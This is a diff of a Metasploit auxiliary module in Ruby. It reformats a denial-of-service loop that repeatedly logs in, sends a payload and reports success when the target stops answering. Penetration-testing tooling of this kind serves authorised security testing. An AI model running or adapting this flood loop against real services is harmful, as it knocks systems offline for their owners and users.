@@ -76,23 +76,28 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Payload being sent: #{payload}")
     print_status('sending payload')
 
-        loop do
+    loop do
+      print('.')
       connect_login
-          10.times do
+      10.times do
         send_cmd([payload.to_s], false)
-          end
+      end
       send_cmd([payload.to_s], true)
       disconnect
-        rescue Rex::ConnectionTimeout
-          print_error('Connection timeout! Sending again')
-        rescue Errno::ECONNRESET
-          print_error('Connection reset!')
-        rescue Rex::ConnectionRefused
-          print_good('Connection refused! Appears DOS attack succeeded.')
+    rescue Rex::ConnectionTimeout
+      print("\n")
+      print_error('Connection timeout! Sending again')
+    rescue Errno::ECONNRESET
+      print("\n")
+      print_error('Connection reset!')
+    rescue Rex::ConnectionRefused
+      print("\n")
+      print_good('Connection refused! Appears DOS attack succeeded.')
     rescue EOFError
+      print("\n")
       print_good('Stream was cut off abruptly. Appears DOS attack succeeded.')
       break
-  end
+    end
     disconnect
   end
 end
